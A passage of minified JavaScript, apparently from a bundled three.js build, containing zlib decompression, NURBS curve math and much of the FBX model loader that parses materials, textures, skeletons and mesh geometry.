e.u&&(r+=e.u)),2>r?i=(n=(o.length-this.a)/this.o[2]/2*258|0)<a.length?a.length+n:a.length<<1:i=a.length*r,qp?(t=new Uint8Array(i)).set(a):t=a,this.c=t},Yp.prototype.n=function(){var e,t,i,n,r,o=0,a=this.c,s=this.g,c=new(qp?Uint8Array:Array)(this.l+(this.b-32768));if(0===s.length)return qp?this.c.subarray(32768,this.b):this.c.slice(32768,this.b);for(t=0,i=s.length;t<i;++t)for(n=0,r=(e=s[t]).length;n<r;++n)c[o++]=e[n];for(t=32768,i=this.b;t<i;++t)c[o++]=a[t];return this.g=[],this.buffer=c},Yp.prototype.v=function(){var e,t=this.b;return qp?this.r?(e=new Uint8Array(t)).set(this.c.subarray(0,t)):e=this.c.subarray(0,t):(this.c.length>t&&(this.c.length=t),e=this.c),this.buffer=e},bf.prototype.k=function(){var e,t,i=this.input;if(e=this.q.k(),this.a=this.q.a,this.A){t=(i[this.a++]<<24|i[this.a++]<<16|i[this.a++]<<8|i[this.a++])>>>0;var n=e;if("string"==typeof n){var r,o,a=n.split("");for(r=0,o=a.length;r<o;r++)a[r]=(255&a[r].charCodeAt(0))>>>0;n=a}for(var s,c=1,l=0,h=n.length,u=0;0<h;){h-=s=1024<h?1024:h;do{l+=c+=n[u++]}while(--s);c%=65521,l%=65521}if(t!==(l<<16|c)>>>0)throw Error("invalid adler-32 checksum")}return e};var wf=8;Wp("Zlib.Inflate",bf),Wp("Zlib.Inflate.prototype.decompress",bf.prototype.k);var xf,_f,Mf,Sf,Tf={ADAPTIVE:$p.s,BLOCK:$p.t};if(Object.keys)xf=Object.keys(Tf);else for(_f in xf=[],Mf=0,Tf)xf[Mf++]=_f;for(Mf=0,Sf=xf.length;Mf<Sf;++Mf)Wp("Zlib.Inflate.BufferType."+(_f=xf[Mf]),Tf[_f]);var Ef=Hp.Zlib,Af={findSpan:function(e,t,i){var n=i.length-e-1;if(t>=i[n])return n-1;if(t<=i[e])return e;for(var r=e,o=n,a=Math.floor((r+o)/2);t<i[a]||t>=i[a+1];)t<i[a]?o=a:r=a,a=Math.floor((r+o)/2);return a},calcBasisFunctions:function(e,t,i,n){var r=[],o=[],a=[];r[0]=1;for(var s=1;s<=i;++s){o[s]=t-n[e+1-s],a[s]=n[e+s]-t;for(var c=0,l=0;l<s;++l){var h=a[l+1],u=o[s-l],d=r[l]/(h+u);r[l]=c+h*d,c=u*d}r[s]=c}return r},calcBSplinePoint:function(e,t,i,n){for(var r=this.findSpan(e,n,t),o=this.calcBasisFunctions(r,n,e,t),a=new T(0,0,0,0),s=0;s<=e;++s){var c=i[r-e+s],l=o[s],h=c.w*l;a.x+=c.x*h,a.y+=c.y*h,a.z+=c.z*h,a.w+=c.w*l}return a},calcBasisFunctionDerivatives:function(e,t,i,n,r){for(var o=[],a=0;a<=i;++a)o[a]=0;var s=[];for(a=0;a<=n;++a)s[a]=o.slice(0);var c=[];for(a=0;a<=i;++a)c[a]=o.slice(0);c[0][0]=1;for(var l=o.slice(0),h=o.slice(0),u=1;u<=i;++u){l[u]=t-r[e+1-u],h[u]=r[e+u]-t;for(var d=0,p=0;p<u;++p){var f=h[p+1],m=l[u-p];c[u][p]=f+m;var v=c[p][u-1]/c[u][p];c[p][u]=d+f*v,d=m*v}c[u][u]=d}for(u=0;u<=i;++u)s[0][u]=c[u][i];for(p=0;p<=i;++p){var g=0,y=1,b=[];for(a=0;a<=i;++a)b[a]=o.slice(0);b[0][0]=1;for(var w=1;w<=n;++w){var x=0,_=p-w,M=i-w;p>=w&&(b[y][0]=b[g][0]/c[M+1][_],x=b[y][0]*c[_][M]);var S=p-1<=M?w-1:i-p;for(u=_>=-1?1:-_;u<=S;++u)b[y][u]=(b[g][u]-b[g][u-1])/c[M+1][_+u],x+=b[y][u]*c[_+u][M];p<=M&&(b[y][w]=-b[g][w-1]/c[M+1][p],x+=b[y][w]*c[p][M]),s[w][p]=x;u=g;g=y,y=u}}for(p=i,w=1;w<=n;++w){for(u=0;u<=i;++u)s[w][u]*=p;p*=i-w}return s},calcBSplineDerivatives:function(e,t,i,n,r){for(var o=r<e?r:e,a=[],s=this.findSpan(e,n,t),c=this.calcBasisFunctionDerivatives(s,n,e,o,t),l=[],h=0;h<i.length;++h){var u=(p=i[h].clone()).w;p.x*=u,p.y*=u,p.z*=u,l[h]=p}for(var d=0;d<=o;++d){for(var p=l[s-e].clone().multiplyScalar(c[d][0]),f=1;f<=e;++f)p.add(l[s-e+f].clone().multiplyScalar(c[d][f]));a[d]=p}for(d=o+1;d<=r+1;++d)a[d]=new T(0,0,0);return a},calcKoverI:function(e,t){for(var i=1,n=2;n<=e;++n)i*=n;var r=1;for(n=2;n<=t;++n)r*=n;for(n=2;n<=e-t;++n)r*=n;return i/r},calcRationalCurveDerivatives:function(e){for(var t=e.length,i=[],n=[],r=0;r<t;++r){var o=e[r];i[r]=new y(o.x,o.y,o.z),n[r]=o.w}for(var a=[],s=0;s<t;++s){var c=i[s].clone();for(r=1;r<=s;++r)c.sub(a[s-r].clone().multiplyScalar(this.calcKoverI(s,r)*n[r]));a[s]=c.divideScalar(n[0])}return a},calcNURBSDerivatives:function(e,t,i,n,r){var o=this.calcBSplineDerivatives(e,t,i,n,r);return this.calcRationalCurveDerivatives(o)},calcSurfacePoint:function(e,t,i,n,r,o,a,s){for(var c=this.findSpan(e,o,i),l=this.findSpan(t,a,n),h=this.calcBasisFunctions(c,o,e,i),u=this.calcBasisFunctions(l,a,t,n),d=[],p=0;p<=t;++p){d[p]=new T(0,0,0,0);for(var f=0;f<=e;++f){var m=r[c-e+f][l-t+p].clone(),v=m.w;m.x*=v,m.y*=v,m.z*=v,d[p].add(m.multiplyScalar(h[f]))}}var g=new T(0,0,0,0);for(p=0;p<=t;++p)g.add(d[p].multiplyScalar(u[p]));g.divideScalar(g.w),s.set(g.x,g.y,g.z)}},Cf=function(e,t,i,n,r){os.call(this),this.degree=e,this.knots=t,this.controlPoints=[],this.startKnot=n||0,this.endKnot=r||this.knots.length-1;for(var o=0;o<i.length;++o){var a=i[o];this.controlPoints[o]=new T(a.x,a.y,a.z,a.w)}};(Cf.prototype=Object.create(os.prototype)).constructor=Cf,Cf.prototype.getPoint=function(e){var t=this.knots[this.startKnot]+e*(this.knots[this.endKnot]-this.knots[this.startKnot]),i=Af.calcBSplinePoint(this.degree,this.knots,this.controlPoints,t);return 1!=i.w&&i.divideScalar(i.w),new y(i.x,i.y,i.z)},Cf.prototype.getTangent=function(e){var t=this.knots[0]+e*(this.knots[this.knots.length-1]-this.knots[0]),i=Af.calcNURBSDerivatives(this.degree,this.knots,this.controlPoints,t,1)[1].clone();return i.normalize(),i};var Pf=function(){var e,t,i;function n(e){Qa.call(this,e)}function r(e,t){this.textureLoader=e,this.manager=t}function o(){}function a(){}function s(){}function c(){}function l(e,t){this.dv=new DataView(e),this.offset=0,this.littleEndian=void 0===t||t}function h(){}function u(e){var t=e.match(/FBXVersion: (\d+)/);if(t)return parseInt(t[1]);throw new Error("THREE.FBXLoader: Cannot find the version number for the file given.")}function d(e){return e/46186158e3}n.prototype=Object.assign(Object.create(Qa.prototype),{constructor:n,load:function(e,t,i,n){var r=this,o=""===r.path?Vs(e):r.path,a=new Ja(this.manager);a.setPath(r.path),a.setResponseType("arraybuffer"),a.load(e,(function(i){try{t(r.parse(i,o))}catch(t){setTimeout((function(){n&&n(t),r.manager.itemError(e)}),0)}}),i,n)},parse:function(t,i){if(a="Kaydara FBX Binary  \0",(o=t).byteLength>=a.length&&a===E(o,0,a.length))e=(new c).parse(t);else{var n=E(t);if(!function(e){var t=["K","a","y","d","a","r","a","\\","F","B","X","\\","B","i","n","a","r","y","\\","\\"],i=0;for(var n=0;n<t.length;++n){if((o=void 0,o=e[(r=1)-1],e=e.slice(i+r),i++,o)===t[n])return!1}var r,o;return!0}(n))throw new Error("THREE.FBXLoader: Unknown format.");if(u(n)<7e3)throw new Error("THREE.FBXLoader: FBX version not supported, FileVersion: "+u(n));e=(new s).parse(n)}var o,a;return new r(new rs(this.manager).setPath(this.resourcePath||i).setCrossOrigin(this.crossOrigin),this.manager).parse(e)}}),r.prototype={constructor:r,parse:function(){t=this.parseConnections();var e=this.parseImages(),n=this.parseTextures(e),r=this.parseMaterials(n),a=this.parseDeformers(),s=(new o).parse(a);return this.parseScene(a,s,r),i},parseConnections:function(){var t=new Map;"Connections"in e&&e.Connections.connections.forEach((function(e){var i=e[0],n=e[1],r=e[2];t.has(i)||t.set(i,{parents:[],children:[]});var o={ID:n,relationship:r};t.get(i).parents.push(o),t.has(n)||t.set(n,{parents:[],children:[]});var a={ID:i,relationship:r};t.get(n).children.push(a)}));return t},parseImages:function(){var t={},i={};if("Video"in e.Objects){var n=e.Objects.Video;for(var r in n){var o=n[r];if(t[l=parseInt(r)]=o.RelativeFilename||o.Filename,"Content"in o){var a=o.Content instanceof ArrayBuffer&&o.Content.byteLength>0,s="string"==typeof o.Content&&""!==o.Content;if(a||s){var c=this.parseImage(n[r]);i[o.RelativeFilename||o.Filename]=c}}}}for(var l in t){var h=t[l];void 0!==i[h]?t[l]=i[h]:t[l]=t[l].split("\\").pop()}return t},parseImage:function(e){var t,i=e.Content,n=e.RelativeFilename||e.Filename,r=n.slice(n.lastIndexOf(".")+1).toLowerCase();switch(r){case"bmp":t="image/bmp";break;case"jpg":case"jpeg":t="image/jpeg";break;case"png":t="image/png";break;case"tif":t="image/tiff";break;case"tga":null===this.manager.getHandler(".tga")&&console.warn("FBXLoader: TGA loader not found, skipping ",n),t="image/tga";break;default:return void console.warn('FBXLoader: Image type "'+r+'" is not supported.')}if("string"==typeof i)return"data:"+t+";base64,"+i;var o=new Uint8Array(i);return window.URL.createObjectURL(new Blob([o],{type:t}))},parseTextures:function(t){var i=new Map;if("Texture"in e.Objects){var n=e.Objects.Texture;for(var r in n){var o=this.parseTexture(n[r],t);i.set(parseInt(r),o)}}return i},parseTexture:function(e,t){var i=this.loadTexture(e,t);i.ID=e.id,i.name=e.attrName;var n=e.WrapModeU,r=e.WrapModeV,o=void 0!==n?n.value:0,a=void 0!==r?r.value:0;if(i.wrapS=0===o?1e3:1001,i.wrapT=0===a?1e3:1001,"Scaling"in e){var s=e.Scaling.value;i.repeat.x=s[0],i.repeat.y=s[1]}return i},loadTexture:function(e,i){var n,r,o=this.textureLoader.path,a=t.get(e.id).children;void 0!==a&&a.length>0&&void 0!==i[a[0].ID]&&(0!==(n=i[a[0].ID]).indexOf("blob:")&&0!==n.indexOf("data:")||this.textureLoader.setPath(void 0));var s=e.FileName.slice(-3).toLowerCase();if("tga"===s){var c=this.manager.getHandler(".tga");null===c?(console.warn("FBXLoader: TGA loader not found, creating placeholder texture for",e.RelativeFilename),r=new S):r=c.load(n)}else"psd"===s?(console.warn("FBXLoader: PSD textures are not supported, creating placeholder texture for",e.RelativeFilename),r=new S):r=this.textureLoader.load(n);return this.textureLoader.setPath(o),r},parseMaterials:function(t){var i=new Map;if("Material"in e.Objects){var n=e.Objects.Material;for(var r in n){var o=this.parseMaterial(n[r],t);null!==o&&i.set(parseInt(r),o)}}return i},parseMaterial:function(e,i){var n=e.id,r=e.attrName,o=e.ShadingModel;if("object"==typeof o&&(o=o.value),!t.has(n))return null;var a,s=this.parseParameters(e,i,n);switch(o.toLowerCase()){case"phong":a=new Ta;break;case"lambert":a=new Ca;break;default:console.warn('THREE.FBXLoader: unknown material type "%s". Defaulting to MeshPhongMaterial.',o),a=new Ta}return a.setValues(s),a.name=r,a},parseParameters:function(e,i,n){var r={};e.BumpFactor&&(r.bumpScale=e.BumpFactor.value),e.Diffuse?r.color=(new Ne).fromArray(e.Diffuse.value):e.DiffuseColor&&"Color"===e.DiffuseColor.type&&(r.color=(new Ne).fromArray(e.DiffuseColor.value)),e.DisplacementFactor&&(r.displacementScale=e.DisplacementFactor.value),e.Emissive?r.emissive=(new Ne).fromArray(e.Emissive.value):e.EmissiveColor&&"Color"===e.EmissiveColor.type&&(r.emissive=(new Ne).fromArray(e.EmissiveColor.value)),e.EmissiveFactor&&(r.emissiveIntensity=parseFloat(e.EmissiveFactor.value)),e.Opacity&&(r.opacity=parseFloat(e.Opacity.value)),r.opacity<1&&(r.transparent=!0),e.ReflectionFactor&&(r.reflectivity=e.ReflectionFactor.value),e.Shininess&&(r.shininess=e.Shininess.value),e.Specular?r.specular=(new Ne).fromArray(e.Specular.value):e.SpecularColor&&"Color"===e.SpecularColor.type&&(r.specular=(new Ne).fromArray(e.SpecularColor.value));var o=this;return t.get(n).children.forEach((function(e){var t=e.relationship;switch(t){case"Bump":r.bumpMap=o.getTexture(i,e.ID);break;case"Maya|TEX_ao_map":r.aoMap=o.getTexture(i,e.ID);break;case"DiffuseColor":case"Maya|TEX_color_map":r.map=o.getTexture(i,e.ID),r.map.encoding=3001;break;case"DisplacementColor":r.displacementMap=o.getTexture(i,e.ID);break;case"EmissiveColor":r.emissiveMap=o.getTexture(i,e.ID),r.emissiveMap.encoding=3001;break;case"NormalMap":case"Maya|TEX_normal_map":r.normalMap=o.getTexture(i,e.ID);break;case"ReflectionColor":r.envMap=o.getTexture(i,e.ID),r.envMap.mapping=303,r.envMap.encoding=3001;break;case"SpecularColor":r.specularMap=o.getTexture(i,e.ID),r.specularMap.encoding=3001;break;case"TransparentColor":r.alphaMap=o.getTexture(i,e.ID),r.transparent=!0;break;case"AmbientColor":case"ShininessExponent":case"SpecularFactor":case"VectorDisplacementColor":default:console.warn("THREE.FBXLoader: %s map is not supported in three.js, skipping texture.",t)}})),r},getTexture:function(i,n){return"LayeredTexture"in e.Objects&&n in e.Objects.LayeredTexture&&(console.warn("THREE.FBXLoader: layered textures are not supported in three.js. Discarding all but first layer."),n=t.get(n).children[0].ID),i.get(n)},parseDeformers:function(){var i={},n={};if("Deformer"in e.Objects){var r=e.Objects.Deformer;for(var o in r){var a=r[o],s=t.get(parseInt(o));if("Skin"===a.attrType){var c=this.parseSkeleton(s,r);c.ID=o,s.parents.length>1&&console.warn("THREE.FBXLoader: skeleton attached to more than one geometry is not supported."),c.geometryID=s.parents[0].ID,i[o]=c}else if("BlendShape"===a.attrType){var l={id:o};l.rawTargets=this.parseMorphTargets(s,r),l.id=o,s.parents.length>1&&console.warn("THREE.FBXLoader: morph target attached to more than one geometry is not supported."),n[o]=l}}}return{skeletons:i,morphTargets:n}},parseSkeleton:function(e,t){var i=[];return e.children.forEach((function(e){var n=t[e.ID];if("Cluster"===n.attrType){var r={ID:e.ID,indices:[],weights:[],transformLink:(new B).fromArray(n.TransformLink.a)};"Indexes"in n&&(r.indices=n.Indexes.a,r.weights=n.Weights.a),i.push(r)}})),{rawBones:i,bones:[]}},parseMorphTargets:function(e,i){for(var n=[],r=0;r<e.children.length;r++){var o=e.children[r],a=i[o.ID],s={name:a.attrName,initialWeight:a.DeformPercent,id:a.id,fullWeights:a.FullWeights.a};if("BlendShapeChannel"!==a.attrType)return;s.geoID=t.get(parseInt(o.ID)).children.filter((function(e){return void 0===e.relationship}))[0].ID,n.push(s)}return n},parseScene:function(n,r,o){i=new ir;var s=this.parseModels(n.skeletons,r,o),c=e.Objects.Model,l=this;s.forEach((function(e){var n=c[e.ID];l.setLookAtProperties(e,n),t.get(e.ID).parents.forEach((function(t){var i=s.get(t.ID);void 0!==i&&i.add(e)})),null===e.parent&&i.add(e)})),this.bindSkeleton(n.skeletons,r,s),this.createAmbientLight(),this.setupMorphMaterials(),i.traverse((function(e){if(e.userData.transformData){e.parent&&(e.userData.transformData.parentMatrixWorld=e.parent.matrix);var t=w(e.userData.transformData);e.applyMatrix(t)}}));var h=(new a).parse();1===i.children.length&&i.children[0].isGroup&&(i.children[0].animations=h,i=i.children[0]),i.animations=h},parseModels:function(i,n,r){var o=new Map,a=e.Objects.Model;for(var s in a){var c=parseInt(s),l=a[s],h=t.get(c),u=this.buildSkeleton(h,i,c,l.attrName);if(!u){switch(l.attrType){case"Camera":u=this.createCamera(h);break;case"Light":u=this.createLight(h);break;case"Mesh":u=this.createMesh(h,n,r);break;case"NurbsCurve":u=this.createCurve(h,n);break;case"LimbNode":case"Root":u=new zr;break;case"Null":default:u=new ir}u.name=l.attrName?Ic.sanitizeNodeName(l.attrName):"",u.ID=c}this.getTransformData(u,l),o.set(c,u)}return o},buildSkeleton:function(e,t,i,n){var r=null;return e.parents.forEach((function(e){for(var o in t){var a=t[o];a.rawBones.forEach((function(t,o){if(t.ID===e.ID){var s=r;(r=new zr).matrixWorld.copy(t.transformLink),r.name=n?Ic.sanitizeNodeName(n):"",r.ID=i,a.bones[o]=r,null!==s&&r.add(s)}}))}})),r},createCamera:function(t){var i,n;if(t.children.forEach((function(t){var i=e.Objects.NodeAttribute[t.ID];void 0!==i&&(n=i)})),void 0===n)i=new K;else{var r=0;void 0!==n.CameraProjectionType&&1===n.CameraProjectionType.value&&(r=1);var o=1;void 0!==n.NearPlane&&(o=n.NearPlane.value/1e3);var a=1e3;void 0!==n.FarPlane&&(a=n.FarPlane.value/1e3);var s=window.innerWidth,c=window.innerHeight;void 0!==n.AspectWidth&&void 0!==n.AspectHeight&&(s=n.AspectWidth.value,c=n.AspectHeight.value);var l=s/c,h=45;void 0!==n.FieldOfView&&(h=n.FieldOfView.value);var u=n.FocalLength?n.FocalLength.value:null;switch(r){case 0:i=new Gt(h,l,o,a),null!==u&&i.setFocalLength(u);break;case 1:i=new Bs(-s/2,s/2,c/2,-c/2,o,a);break;default:console.warn("THREE.FBXLoader: Unknown camera type "+r+"."),i=new K}}return i},createLight:function(t){var i,n;if(t.children.forEach((function(t){var i=e.Objects.NodeAttribute[t.ID];void 0!==i&&(n=i)})),void 0===n)i=new K;else{var r;r=void 0===n.LightType?0:n.LightType.value;var o=16777215;void 0!==n.Color&&(o=(new Ne).fromArray(n.Color.value));var a=void 0===n.Intensity?1:n.Intensity.value/100;void 0!==n.CastLightOnObject&&0===n.CastLightOnObject.value&&(a=0);var s=0;void 0!==n.FarAttenuationEnd&&(s=void 0!==n.EnableFarAttenuation&&0===n.EnableFarAttenuation.value?0:n.FarAttenuationEnd.value);switch(r){case 0:i=new Is(o,a,s,1);break;case 1:i=new zs(o,a);break;case 2:var c=Math.PI/3;void 0!==n.InnerAngle&&(c=p.degToRad(n.InnerAngle.value));var l=0;void 0!==n.OuterAngle&&(l=p.degToRad(n.OuterAngle.value),l=Math.max(l,1)),i=new ks(o,a,s,c,l,1);break;default:console.warn("THREE.FBXLoader: Unknown light type "+n.LightType.value+", defaulting to a PointLight."),i=new Is(o,a)}void 0!==n.CastShadows&&1===n.CastShadows.value&&(i.castShadow=!0)}return i},createMesh:function(e,t,i){var n,r=null,o=null,a=[];return e.children.forEach((function(e){t.has(e.ID)&&(r=t.get(e.ID)),i.has(e.ID)&&a.push(i.get(e.ID))})),a.length>1?o=a:a.length>0?o=a[0]:(o=new Ta({color:13421772}),a.push(o)),"color"in r.attributes&&a.forEach((function(e){e.vertexColors=2})),r.FBX_Deformer?(a.forEach((function(e){e.skinning=!0})),(n=new Or(r,o)).normalizeSkinWeights()):n=new Lt(r,o),n},createCurve:function(e,t){return new Wr(e.children.reduce((function(e,i){return t.has(i.ID)&&(e=t.get(i.ID)),e}),null),new Nr({color:3342591,linewidth:1}))},getTransformData:function(e,t){var i={};"InheritType"in t&&(i.inheritType=parseInt(t.InheritType.value)),i.eulerOrder="RotationOrder"in t?_(t.RotationOrder.value):"ZYX","Lcl_Translation"in t&&(i.translation=t.Lcl_Translation.value),"PreRotation"in t&&(i.preRotation=t.PreRotation.value),"Lcl_Rotation"in t&&(i.rotation=t.Lcl_Rotation.value),"PostRotation"in t&&(i.postRotation=t.PostRotation.value),"Lcl_Scaling"in t&&(i.scale=t.Lcl_Scaling.value),"ScalingOffset"in t&&(i.scalingOffset=t.ScalingOffset.value),"ScalingPivot"in t&&(i.scalingPivot=t.ScalingPivot.value),"RotationOffset"in t&&(i.rotationOffset=t.RotationOffset.value),"RotationPivot"in t&&(i.rotationPivot=t.RotationPivot.value),e.userData.transformData=i},setLookAtProperties:function(n,r){"LookAtProperty"in r&&t.get(n.ID).children.forEach((function(t){if("LookAtProperty"===t.relationship){var r=e.Objects.Model[t.ID];if("Lcl_Translation"in r){var o=r.Lcl_Translation.value;void 0!==n.target?(n.target.position.fromArray(o),i.add(n.target)):n.lookAt((new y).fromArray(o))}}}))},bindSkeleton:function(e,i,n){var r=this.parsePoseNodes();for(var o in e){var a=e[o];t.get(parseInt(a.ID)).parents.forEach((function(e){if(i.has(e.ID)){var o=e.ID;t.get(o).parents.forEach((function(e){n.has(e.ID)&&n.get(e.ID).bind(new Dr(a.bones),r[e.ID])}))}}))}},parsePoseNodes:function(){var t={};if("Pose"in e.Objects){var i=e.Objects.Pose;for(var n in i)if("BindPose"===i[n].attrType){var r=i[n].PoseNode;Array.isArray(r)?r.forEach((function(e){t[e.Node]=(new B).fromArray(e.Matrix.a)})):t[r.Node]=(new B).fromArray(r.Matrix.a)}}return t},createAmbientLight:function(){if("GlobalSettings"in e&&"AmbientColor"in e.GlobalSettings){var t=e.GlobalSettings.AmbientColor.value,n=t[0],r=t[1],o=t[2];if(0!==n||0!==r||0!==o){var a=new Ne(n,r,o);i.add(new Fs(a,1))}}},setupMorphMaterials:function(){var e=this;i.traverse((function(t){t.isMesh&&t.geometry.morphAttributes.position&&t.geometry.morphAttributes.position.length&&(Array.isArray(t.material)?t.material.forEach((function(i,n){e.setupMorphMaterial(t,i,n)})):e.setupMorphMaterial(t,t.material))}))},setupMorphMaterial:function(e,t,n){var r=e.uuid,o=t.uuid,a=!1;if(i.traverse((function(e){e.isMesh&&(Array.isArray(e.material)?e.material.forEach((function(t){t.uuid===o&&e.uuid!==r&&(a=!0)})):e.material.uuid===o&&e.uuid!==r&&(a=!0))})),!0===a){var s=t.clone();s.morphTargets=!0,void 0===n?e.material=s:e.material[n]=s}else t.morphTargets=!0}},o.prototype={constructor:o,parse:function(i){var n=new Map;if("Geometry"in e.Objects){var r=e.Objects.Geometry;for(var o in r){var a=t.get(parseInt(o)),s=this.parseGeometry(a,r[o],i);n.set(parseInt(o),s)}}return n},parseGeometry:function(e,t,i){switch(t.attrType){case"Mesh":return this.parseMeshGeometry(e,t,i);case"NurbsCurve":return this.parseNurbsGeometry(t)}},parseMeshGeometry:function(t,i,n){var r=n.skeletons,o=[],a=t.parents.map((function(t){return e.Objects.Model[t.ID]}));if(0!==a.length){var s=t.children.reduce((function(e,t){return void 0!==r[t.ID]&&(e=r[t.ID]),e}),null);t.children.forEach((function(e){void 0!==n.morphTargets[e.ID]&&o.push(n.morphTargets[e.ID])}));var c=a[0],l={};"RotationOrder"in c&&(l.eulerOrder=_(c.RotationOrder.value)),"InheritType"in c&&(l.inheritType=parseInt(c.InheritType.value)),"GeometricTranslation"in c&&(l.translation=c.GeometricTranslation.value),"GeometricRotation"in c&&(l.rotation=c.GeometricRotation.value),"GeometricScaling"in c&&(l.scale=c.GeometricScaling.value);var h=w(l);return this.genGeometry(i,s,o,h)}},genGeometry:function(e,t,i,n){var r=new dt;e.attrName&&(r.name=e.attrName);var o=this.parseGeoNode(e,t),a=this.genBuffers(o),s=new tt(a.vertex,3);if(n.applyToBufferAttribute(s),r.addAttribute("position",s),a.colors.length>0&&r.addAttribute("color",new tt(a.colors,3)),t&&(r.addAttribute("skinIndex",new Je(a.weightsIndices,4)),r.addAttribute("skinWeight",new tt(a.vertexWeights,4)),r.FBX_Deformer=t),a.normal.length>0){var c=new tt(a.normal,3);(new x).getNormalMatrix(n).applyToBufferAttribute(c),r.addAttribute("normal",c)}if(a.uvs.forEach((function(e,t){var i="uv"+(t+1).toString();0===t&&(i="uv"),r.addAttribute(i,new tt(a.uvs[t],2))})),o.material&&"AllSame"!==o.material.mappingType){var l=a.materialIndex[0],h=0;if(a.materialIndex.forEach((function(e,t){e!==l&&(r.addGroup(h,t-h,l),l=e,h=t)})),r.groups.length>0){var u=r.groups[r.groups.length-1],d=u.start+u.count;d!==a.materialIndex.length&&r.addGroup(d,a.materialIndex.length-d,l)}0===r.groups.length&&r.addGroup(0,a.materialIndex.length,a.materialIndex[0])}return this.addMorphTargets(r,e,i,n),r},parseGeoNode:function(e,t){var i={};if(i.vertexPositions=void 0!==e.Vertices?e.Vertices.a:[],i.vertexIndices=void 0!==e.PolygonVertexIndex?e.PolygonVertexIndex.a:[],e.LayerElementColor&&(i.color=this.parseVertexColors(e.LayerElementColor[0])),e.LayerElementMaterial&&(i.material=this.parseMaterialIndices(e.LayerElementMaterial[0])),e.LayerElementNormal&&(i.normal=this.parseNormals(e.LayerElementNormal[0])),e.LayerElementUV){i.uv=[];for(var n=0;e.LayerElementUV[n];)i.uv.push(this.parseUVs(e.LayerElementUV[n])),n++}return i.weightTable={},null!==t&&(i.skeleton=t,t.rawBones.forEach((function(e,t){e.indices.forEach((function(n,r){void 0===i.weightTable[n]&&(i.weightTable[n]=[]),i.weightTable[n].push({id:t,weight:e.weights[r]})}))}))),i},genBuffers:function(e){var t={vertex:[],normal:[],colors:[],uvs:[],materialIndex:[],vertexWeights:[],weightsIndices:[]},i=0,n=0,r=!1,o=[],a=[],s=[],c=[],l=[],h=[],u=this;return e.vertexIndices.forEach((function(d,p){var f=!1;d<0&&(d^=-1,f=!0);var m=[],g=[];if(o.push(3*d,3*d+1,3*d+2),e.color){var y=v(p,i,d,e.color);s.push(y[0],y[1],y[2])}if(e.skeleton){if(void 0!==e.weightTable[d]&&e.weightTable[d].forEach((function(e){g.push(e.weight),m.push(e.id)})),g.length>4){r||(console.warn("THREE.FBXLoader: Vertex has more than 4 skinning weights assigned to vertex. Deleting additional weights."),r=!0);var b=[0,0,0,0],w=[0,0,0,0];g.forEach((function(e,t){var i=e,n=m[t];w.forEach((function(e,t,r){if(i>e){r[t]=i,i=e;var o=b[t];b[t]=n,n=o}}))})),m=b,g=w}for(;g.length<4;)g.push(0),m.push(0);for(var x=0;x<4;++x)l.push(g[x]),h.push(m[x])}if(e.normal){y=v(p,i,d,e.normal);a.push(y[0],y[1],y[2])}if(e.material&&"AllSame"!==e.material.mappingType)var _=v(p,i,d,e.material)[0];e.uv&&e.uv.forEach((function(e,t){var n=v(p,i,d,e);void 0===c[t]&&(c[t]=[]),c[t].push(n[0]),c[t].push(n[1])})),n++,f&&(u.genFace(t,e,o,_,a,s,c,l,h,n),i++,n=0,o=[],a=[],s=[],c=[],l=[],h=[])})),t},genFace:function(e,t,i,n,r,o,a,s,c,l){for(var h=2;h<l;h++)e.vertex.push(t.vertexPositions[i[0]]),e.vertex.push(t.vertexPositions[i[1]]),e.vertex.push(t.vertexPositions[i[2]]),e.vertex.push(t.vertexPositions[i[3*(h-1)]]),e.vertex.push(t.vertexPositions[i[3*(h-1)+1]]),e.vertex.push(t.vertexPositions[i[3*(h-1)+2]]),e.vertex.push(t.vertexPositions[i[3*h]]),e.vertex.push(t.vertexPositions[i[3*h+1]]),e.vertex.push(t.vertexPositions[i[3*h+2]]),t.skeleton&&(e.vertexWeights.push(s[0]),e.vertexWeights.push(s[1]),e.vertexWeights.push(s[2]),e.vertexWeights.push(s[3]),e.vertexWeights.push(s[4*(h-1)]),e.vertexWeights.push(s[4*(h-1)+1]),e.vertexWeights.push(s[4*(h-1)+2]),e.vertexWeights.push(s[4*(h-1)+3]),e.vertexWeights.push(s[4*h]),e.vertexWeights.push(s[4*h+1]),e.vertexWeights.push(s[4*h+2]),e.vertexWeights.push(s[4*h+3]),e.weightsIndices.push(c[0]),e.weightsIndices.push(c[1]),e.weightsIndices.push(c[2]),e.weightsIndices.push(c[3]),e.weightsIndices.push(c[4*(h-1)]),e.weightsIndices.push(c[4*(h-1)+1]),e.weightsIndices.push(c[4*(h-1)+2]),e.weightsIndices.push(c[4*(h-1)+3]),e.weightsIndices.push(c[4*h]),e.weightsIndices.push(c[4*h+1]),e.weightsIndices.push(c[4*h+2]),e.weightsIndices.push(c[4*h+3])),t.color&&(e.colors.push(o[0]),e.colors.push(o[1]),e.colors.push(o[2]),e.colors.push(o[3*(h-1)]),e.colors.push(o[3*(h-1)+1]),e.colors.push(o[3*(h-1)+2]),e.colors.push(o[3*h]),e.colors.push(o[3*h+1]),e.colors.push(o[3*h+2])),t.material&&"AllSame"!==t.material.mappingType&&(e.materialIndex.push(n),e.materialIndex.push(n),e.materialIndex.push(n)),t.normal&&(e.normal.push(r[0]),e.normal.push(r[1]),e.normal.push(r[2]),e.normal.push(r[3*(h-1)]),e.normal.push(r[3*(h-1)+1]),e.normal.push(r[3*(h-1)+2]),e.normal.push(r[3*h]),e.normal.push(r[3*h+1]),e.normal.push(r[3*h+2])),t.uv&&t.uv.forEach((function(t,i){void 0===e.uvs[i]&&(e.uvs[i]=[]),e.uvs[i].push(a[i][0]),e.uvs[i].push(a[i][1]),e.uvs[i].push(a[i][2*(h-1)]),e.uvs[i].push(a[i][2*(h-1)+1]),e.uvs[i].push(a[i][2*h]),e.uvs[i].push(a[i][2*h+1])}))},addMorphTargets:function(t,i,n,r){if(0!==n.length){t.morphAttributes.position=[];var o=this;n.forEach((function(n){n.rawTargets.forEach((function(n){var a=e.Objects.Geometry[n.geoID];void 0!==a&&o.genMorphGeometry(t,i,a,r,n.name)}))}))}},genMorphGeometry:function(e,t,i,n,r){var o=new dt;i.attrName&&(o.name=i.attrName);for(var a=void 0!==t.PolygonVertexIndex?t.PolygonVertexIndex.a:[],s=void 0!==t.Vertices?t.Vertices.a.slice():[],c=void 0!==i.Vertices?i.Vertices.a:[],l=void 0!==i.Indexes?i.Indexes.a:[],h=0;h<l.length;h++){var u=3*l[h];s[u]+=c[3*h],s[u+1]+=c[3*h+1],s[u+2]+=c[3*h+2]}var d={vertexIndices:a,vertexPositions:s},p=new 